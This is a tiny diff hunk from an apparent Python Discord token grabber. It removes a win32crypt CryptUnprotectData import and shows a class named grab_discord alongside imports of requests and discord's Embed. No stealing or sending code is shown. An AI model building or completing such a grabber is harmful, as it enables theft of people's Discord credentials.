@@ -6,7 +6,6 @@ import requests
 import hashlib
 import struct
 from discord import Embed
-from win32crypt import CryptUnprotectData
 
 class grab_discord():
     def initialize(raw_data):
